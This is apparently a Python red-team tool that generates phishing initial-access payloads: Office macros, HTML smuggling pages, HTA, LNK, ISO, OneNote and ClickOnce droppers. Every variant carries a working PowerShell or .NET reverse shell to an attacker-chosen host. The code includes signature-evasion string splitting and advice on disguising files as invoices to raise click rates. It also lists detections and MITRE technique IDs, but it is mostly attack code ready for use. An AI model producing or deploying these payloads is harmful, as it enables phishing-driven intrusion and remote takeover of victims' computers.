"""
Initial access technique generator — VBA macros, HTML smuggling, HTA droppers, LNK shortcuts.
For use in authorized red team exercises only.
"""
import base64
from dataclasses import dataclass, field

SUPPORTED_TECHNIQUES = (
    "vba_macro",
    "html_smuggling",
    "hta_dropper",
    "lnk_shortcut",
    "iso_container",
    "onenote_dropper",
    "clickonce_manifest",
)


@dataclass
class InitialAccessResult:
    payload: str
    technique: str
    delivery_hint: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Variants ──────────────────────────────────────────────────────────────────

def _vba_macro(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);$r+='PS '+(pwd).Path+'> ';"
        f"$x=[text.encoding]::ASCII.GetBytes($r);$s.Write($x,0,$x.Length);$s.Flush()}};"
        f"$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    if obfuscate:
        # Split the encoded command across string variables to evade static sigs
        mid = len(b64_cmd) // 2
        part1, part2 = b64_cmd[:mid], b64_cmd[mid:]
        macro = (
            "Sub AutoOpen()\n"
            "    Dim oShell As Object\n"
            "    Set oShell = CreateObject(\"WScript.Shell\")\n"
            f"    Dim p1 As String\n"
            f"    Dim p2 As String\n"
            f"    p1 = \"{part1}\"\n"
            f"    p2 = \"{part2}\"\n"
            "    Dim cmd As String\n"
            "    cmd = \"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand \" & p1 & p2\n"
            "    oShell.Run cmd, 0, False\n"
            "End Sub\n\n"
            "Sub Document_Open()\n"
            "    AutoOpen\n"
            "End Sub"
        )
    else:
        macro = (
            "Sub AutoOpen()\n"
            "    Dim oShell As Object\n"
            "    Set oShell = CreateObject(\"WScript.Shell\")\n"
            f"    oShell.Run \"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}\", 0, False\n"
            "End Sub\n\n"
            "Sub Document_Open()\n"
            "    AutoOpen\n"
            "End Sub"
        )
    return InitialAccessResult(
        payload=macro,
        technique="vba_macro",
        delivery_hint=(
            "Embed in Word/Excel macro-enabled document (.docm/.xlsm). "
            "Requires user to enable macros (or use older Office without Protected View). "
            "Save as .doc (older format) to include macros without .docm extension."
        ),
        notes=f"PowerShell reverse shell to {lhost}:{lport}. Both AutoOpen and Document_Open trigger macros.",
        techniques=["T1566.001", "T1059.001"],
        risk="HIGH",
        detections=[
            "Office spawning powershell.exe child process (high-fidelity)",
            "AMSI: PowerShell encoded command with socket connection",
            "WScript.Shell CreateObject from winword.exe/excel.exe (Sysmon Event 1)",
        ],
    )


def _html_smuggling(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    # The payload to smuggle — in a real engagement this would be an implant binary
    # Here we generate a VBScript dropper as the smuggled file content
    vbs_content = (
        f'Set oShell = CreateObject("WScript.Shell")\n'
        f'oShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -C '
        f'$c=New-Object System.Net.Sockets.TCPClient(\\"{lhost}\\",{lport});'
        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
        f'while(($i=$s.Read($b,0,$b.Length))-ne 0)'
        f'{{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        f'(iex $d 2>&1|Out-String)+\'PS >\'|%{{[text.encoding]::ASCII.GetBytes($_)}}|'
        f'%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"'
        f', 0, False\n'
    )
    if obfuscate:
        # Encode the VBS payload bytes as a JS array for smuggling
        vbs_bytes = list(vbs_content.encode())
        js_array = ",".join(str(b) for b in vbs_bytes)
        file_name = "Invoice_2024.vbs"
    else:
        vbs_bytes = list(vbs_content.encode())
        js_array = ",".join(str(b) for b in vbs_bytes)
        file_name = "payload.vbs"

    html = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<p>Please wait while your document loads...</p>
<script>
(function() {{
  // Blob-based file delivery — payload never touches disk as a URL fetch
  var bytes = new Uint8Array([{js_array}]);
  var blob = new Blob([bytes], {{type: 'application/octet-stream'}});
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = '{file_name}';
  document.body.appendChild(a);
  a.click();
  setTimeout(function() {{ URL.revokeObjectURL(url); }}, 1000);
}})();
</script>
</body>
</html>"""

    return InitialAccessResult(
        payload=html,
        technique="html_smuggling",
        delivery_hint=(
            "Send HTML page via email link or attachment. "
            "Browser auto-downloads the embedded blob — no network request to attacker server. "
            "User must run the downloaded .vbs file."
        ),
        notes=(
            f"Smuggles VBScript dropper connecting back to {lhost}:{lport}. "
            "Replace the embedded payload with a real implant binary for operational use."
        ),
        techniques=["T1566.002", "T1027.006"],
        risk="HIGH",
        detections=[
            "JavaScript Blob download without corresponding network request (EDR behavioral)",
            "Browser downloading executable file type (.vbs/.exe) (browser telemetry)",
            "WScript.exe execution of dropped .vbs file",
        ],
    )


def _hta_dropper(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> '|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    if obfuscate:
        # Use VBScript with string splitting and char obfuscation
        hta = f"""<html>
<head>
<title>Document</title>
<HTA:Application
    ID="oHTA"
    WindowState="minimize"
    ShowInTaskbar="No"
    Caption="No"
/>
</head>
<body>
<script language="VBScript">
Dim oShell
Set oShell = CreateObject("WS" & "cript.Sh" & "ell")
Dim p
p = "{b64_cmd}"
oShell.Run "pow" & "ershell -NoP -NonI -W Hid" & "den -Exec Byp" & "ass -EncodedCommand " & p, 0, False
Close
</script>
</body>
</html>"""
    else:
        hta = f"""<html>
<head><title>Loading</title>
<HTA:Application WindowState="minimize" ShowInTaskbar="No" Caption="No"/>
</head>
<body>
<script language="VBScript">
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}", 0, False
Close
</script>
</body>
</html>"""

    return InitialAccessResult(
        payload=hta,
        technique="hta_dropper",
        delivery_hint=(
            "Deliver .hta file via email link or attachment. "
            "Windows executes .hta with mshta.exe (bypasses script execution policy). "
            "Can also serve from web: mshta http://attacker/payload.hta"
        ),
        notes=(
            f"HTA executed by mshta.exe, spawning PowerShell reverse shell to {lhost}:{lport}. "
            "HTA runs with Medium integrity by default."
        ),
        techniques=["T1218.005", "T1059.001"],
        risk="HIGH",
        detections=[
            "mshta.exe spawning powershell.exe (high-fidelity Defender/Sysmon rule)",
            "HTA file execution from browser downloads or email client",
            "AMSI detection of PowerShell encoded payload inside mshta context",
        ],
    )


def _lnk_shortcut(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0)"
        f"{{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"iex $d 2>&1|Out-String|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    powershell_cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}"

    # PowerShell script to create the LNK file programmatically
    lnk_creator = (
        f"$WS = New-Object -ComObject WScript.Shell\n"
        f"$LNK = $WS.CreateShortcut('C:\\\\Users\\\\Public\\\\Invoice.lnk')\n"
        f"$LNK.TargetPath = 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\n"
        f"$LNK.Arguments = '-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}'\n"
        f"$LNK.IconLocation = 'C:\\\\Windows\\\\System32\\\\shell32.dll,70'  # PDF icon\n"
        f"$LNK.WindowStyle = 7  # Minimized\n"
        f"$LNK.Save()"
    )

    payload_text = (
        f"# PowerShell to generate the .lnk file (run on attacker or target):\n\n"
        f"{lnk_creator}\n\n"
        f"# --- Resulting LNK executes: ---\n"
        f"# {powershell_cmd}\n\n"
        f"# Delivery: embed in ZIP archive, ISO, or send as email attachment.\n"
        f"# ISO wrapping: LNK inside ISO bypasses Mark-of-the-Web (MotW) on older systems."
    )

    return InitialAccessResult(
        payload=payload_text,
        technique="lnk_shortcut",
        delivery_hint=(
            "Package .lnk in ZIP or ISO for email/phishing delivery. "
            "ISO trick bypasses MotW on Windows < 11 22H2. "
            "Use a PDF/Word icon (shell32.dll icon index) to disguise as document."
        ),
        notes=(
            f"LNK shortcut executes PowerShell reverse shell to {lhost}:{lport}. "
            "Configure icon to mimic expected document type for higher click rates."
        ),
        techniques=["T1566.001", "T1204.002", "T1059.001"],
        risk="HIGH",
        detections=[
            "powershell.exe launched from explorer.exe with encoded command (Sysmon Event 1)",
            "LNK file with TargetPath pointing to powershell.exe",
            "AMSI: PowerShell network connection in encoded payload",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

def _iso_container(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    Generate an ISO build script. ISO containers bypass Mark-of-the-Web (MotW) on
    Windows <11 22H2 because the loop-mounted contents are not tagged with the
    download zone. Common phishing chain: email .iso → user mounts → executes .lnk
    inside → spawns powershell payload.
    """
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> '|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()
    pwsh_args = f"-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}"

    builder = (
        "#!/usr/bin/env bash\n"
        "# Builds an ISO container that bypasses MotW on legacy Windows.\n"
        "# Requires: genisoimage (or mkisofs). On macOS: hdiutil makehybrid.\n"
        "set -euo pipefail\n"
        "WORK=$(mktemp -d)\n"
        "mkdir -p \"$WORK/iso\"\n"
        "cat > \"$WORK/iso/Invoice.lnk.ps1\" <<'EOF'\n"
        "$WS = New-Object -ComObject WScript.Shell\n"
        "$LNK = $WS.CreateShortcut('Invoice.lnk')\n"
        "$LNK.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\n"
        f"$LNK.Arguments = '{pwsh_args}'\n"
        "$LNK.IconLocation = 'C:\\Windows\\System32\\shell32.dll,70'  # PDF\n"
        "$LNK.WindowStyle = 7\n"
        "$LNK.Save()\n"
        "EOF\n"
        "# Drop a decoy PDF beside the LNK for plausibility:\n"
        "echo 'Decoy PDF — open the Invoice shortcut.' > \"$WORK/iso/readme.txt\"\n"
        "powershell -Command - < \"$WORK/iso/Invoice.lnk.ps1\" || \\\n"
        "  echo '[!] Run the .ps1 on a Windows host to produce Invoice.lnk, then place beside readme.txt in the ISO root.'\n"
        "genisoimage -o invoice.iso -V 'Invoice' -J -r \"$WORK/iso\"\n"
        "echo '[+] invoice.iso ready — deliver via email or shared link.'\n"
    )
    return InitialAccessResult(
        payload=builder,
        technique="iso_container",
        delivery_hint=(
            "Deliver invoice.iso via email or file share. On Windows <11 22H2 the "
            "contents are not tagged with Mark-of-the-Web. User mounts → executes "
            "Invoice.lnk → PowerShell connects back to attacker. "
            "On modern Windows, ISO contents now inherit MotW — combine with a "
            "container that strips MotW or use ClickOnce instead."
        ),
        notes=(
            f"PowerShell reverse shell to {lhost}:{lport} embedded in LNK ArgumentList. "
            "The shipped script generates the LNK on a Windows host then packs the ISO."
        ),
        techniques=["T1566.001", "T1204.002", "T1027.006"],
        risk="HIGH",
        detections=[
            "Windows mounted ISO without corresponding browser download chain",
            "LNK execution from removable/virtual disk (Event 4663 + DeviceId)",
            "powershell.exe child of explorer.exe with EncodedCommand argument",
        ],
    )


def _onenote_dropper(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    OneNote .one droppers gained popularity after Microsoft disabled VBA macros
    by default. The .one file embeds a script (typically .hta / .vbs / .cmd /
    .ps1) that the victim must double-click. There is no MotW prompt for embedded
    files on older builds.

    We produce a build script that uses python's `oletools` / `pyOneNote` style
    layout. For maximum reliability operators usually build the .one in OneNote
    directly — the script below provides the embedded payload + a step-by-step
    procedure.
    """
    ps_payload = (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass -C "
        f"\"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"(iex $d 2>&1|Out-String)+'PS> '|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()\""
    )
    embedded_cmd = (
        "@echo off\n"
        "rem onenote_drop.cmd — runs when victim double-clicks embedded attachment\n"
        f"{ps_payload}\n"
    )

    instructions = (
        f"# OneNote .one dropper — workflow\n"
        f"#\n"
        f"# 1. Create a new OneNote section (.one) titled 'Q4 Invoice'.\n"
        f"# 2. Insert > File Attachment > select the embedded .cmd below (saved as\n"
        f"#    onenote_drop.cmd).\n"
        f"# 3. In OneNote, set the file display icon to a PDF or document glyph.\n"
        f"# 4. Add a decoy table above the attachment that visually obscures the\n"
        f"#    .cmd file extension (e.g. 'Please open the attached invoice.pdf').\n"
        f"# 5. Save as `Q4_Invoice.one` and deliver via email.\n"
        f"#\n"
        f"# When the victim double-clicks the embedded attachment, OneNote shows\n"
        f"# a single 'security' warning that is commonly clicked-through. The\n"
        f"# .cmd then spawns the PowerShell reverse shell.\n"
        f"#\n"
        f"# --- onenote_drop.cmd ---\n"
        f"{embedded_cmd}\n"
        f"# --- end ---\n"
        f"#\n"
        f"# Defender note: builds after 2023-04 block embedded executables in\n"
        f"# OneNote by default. Combine with a renamed .lnk inside a .zip if\n"
        f"# the target is on a modern build.\n"
    )

    return InitialAccessResult(
        payload=instructions,
        technique="onenote_dropper",
        delivery_hint=(
            "Send .one file via email attachment. Victim double-clicks embedded "
            "attachment → OneNote shows one prompt → user clicks Run → payload fires."
        ),
        notes=(
            f"PowerShell reverse shell to {lhost}:{lport}. Effective against orgs "
            "that disabled VBA macros but allow OneNote attachments."
        ),
        techniques=["T1566.001", "T1204.002"],
        risk="HIGH",
        detections=[
            "ONENOTE.EXE spawning cmd.exe/powershell.exe (Sysmon Event 1)",
            "OneNote process writing executable extensions to %TEMP%/OneNote",
            "Defender ASR rule 'Block all Office applications from creating child processes' includes OneNote since 2023-04",
        ],
    )


def _clickonce_manifest(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    """
    ClickOnce applications launch via the `ms-appinstaller://` URI scheme on
    older builds, or via downloaded .application manifests. Many corporate
    Windows fleets allow ClickOnce execution because legitimate enterprise apps
    rely on it.
    """
    application_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd"
                manifestVersion="1.0"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:asmv1="urn:schemas-microsoft-com:asm.v1"
                xmlns:asmv2="urn:schemas-microsoft-com:asm.v2"
                xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS"
                xmlns="urn:schemas-microsoft-com:asm.v2"
                xmlns:dsig="http://www.w3.org/2000/09/xmldsig#"
                xmlns:co.v1="urn:schemas-microsoft-com:clickonce.v1"
                xmlns:co.v2="urn:schemas-microsoft-com:clickonce.v2">
  <asmv1:assemblyIdentity name="InvoicePortal.application"
                          version="1.0.0.0"
                          publicKeyToken="0000000000000000"
                          language="neutral"
                          processorArchitecture="msil"
                          xmlns="urn:schemas-microsoft-com:asm.v1" />
  <description asmv2:publisher="InvoiceCorp"
               asmv2:product="Invoice Portal"
               xmlns="urn:schemas-microsoft-com:asm.v1" />
  <deployment install="true" mapFileExtensions="true" trustURLParameters="true">
    <subscription>
      <update>
        <expiration maximumAge="0" unit="hours" />
      </update>
    </subscription>
    <deploymentProvider codebase="http://{lhost}:{lport}/InvoicePortal.application" />
  </deployment>
  <compatibleFrameworks xmlns="urn:schemas-microsoft-com:clickonce.v2">
    <framework targetVersion="4.0" profile="Full" supportedRuntime="4.0.30319" />
  </compatibleFrameworks>
  <dependency>
    <dependentAssembly dependencyType="install"
                       codebase="InvoicePortal.exe.manifest"
                       size="1024">
      <assemblyIdentity name="InvoicePortal.exe"
                        version="1.0.0.0"
                        publicKeyToken="0000000000000000"
                        language="neutral"
                        processorArchitecture="msil"
                        type="win32" />
    </dependentAssembly>
  </dependency>
</asmv1:assembly>
"""

    builder = (
        f"# ClickOnce dropper workflow\n"
        f"# 1. Build a .NET stager (InvoicePortal.exe) that connects back to {lhost}:{lport}.\n"
        f"#    Minimal example (csc.exe build):\n"
        f"#\n"
        f"#    using System;\n"
        f"#    using System.Net.Sockets;\n"
        f"#    using System.Diagnostics;\n"
        f"#    class P {{ static void Main() {{\n"
        f"#      var t = new TcpClient(\"{lhost}\", {lport});\n"
        f"#      var s = t.GetStream();\n"
        f"#      var p = new Process(); p.StartInfo.FileName = \"cmd.exe\";\n"
        f"#      p.StartInfo.UseShellExecute = false;\n"
        f"#      p.StartInfo.RedirectStandardInput = true;\n"
        f"#      p.StartInfo.RedirectStandardOutput = true; p.Start();\n"
        f"#      // bidirectional pipe loops here\n"
        f"#    }} }}\n"
        f"#\n"
        f"# 2. Generate the ClickOnce manifest tree via `mage.exe`:\n"
        f"#    mage -New Application -Processor msil -ToFile InvoicePortal.exe.manifest \\\n"
        f"#         -name 'InvoicePortal.exe' -Version 1.0.0.0 -FromDirectory .\n"
        f"#    mage -New Deployment -Processor msil -Install true -Publisher 'InvoiceCorp' \\\n"
        f"#         -ProviderUrl http://{lhost}:{lport}/InvoicePortal.application \\\n"
        f"#         -AppManifest InvoicePortal.exe.manifest -ToFile InvoicePortal.application\n"
        f"# 3. Host both InvoicePortal.application and InvoicePortal.exe at http://{lhost}:{lport}/\n"
        f"# 4. Deliver the .application URL via email; the Windows shell prompts the\n"
        f"#    victim with 'Open' (no admin required). One click → payload runs.\n"
        f"\n"
        f"# --- InvoicePortal.application (manifest below) ---\n"
        f"{application_xml}"
    )

    return InitialAccessResult(
        payload=builder,
        technique="clickonce_manifest",
        delivery_hint=(
            "Send a link to http://{lhost}:{lport}/InvoicePortal.application in an "
            "email phishing campaign. Most Windows builds allow ClickOnce execution "
            "for arbitrary publishers; the prompt does not warn about untrusted "
            "publishers, just 'Open / Cancel'."
        ).format(lhost=lhost, lport=lport),
        notes=(
            "Requires .NET Framework on target (default on Windows). "
            f"Stager is a .NET assembly that connects back to {lhost}:{lport}."
        ),
        techniques=["T1566.002", "T1218.013", "T1059.003"],
        risk="HIGH",
        detections=[
            "dfsvc.exe (ClickOnce Application Deployment Service) spawning cmd.exe / powershell.exe",
            "AppDeploy events in Microsoft-Windows-ApplicationExperience-LookupSvc/Operational",
            "ClickOnce install logs in %LOCALAPPDATA%\\Apps\\2.0\\Manifests",
        ],
    )


_DISPATCH = {
    "vba_macro": _vba_macro,
    "html_smuggling": _html_smuggling,
    "hta_dropper": _hta_dropper,
    "lnk_shortcut": _lnk_shortcut,
    "iso_container": _iso_container,
    "onenote_dropper": _onenote_dropper,
    "clickonce_manifest": _clickonce_manifest,
}


def generate_initial_access(
    technique: str,
    lhost: str = "192.168.1.100",
    lport: int = 4444,
    obfuscate: bool = True,
) -> InitialAccessResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](lhost, lport, obfuscate)
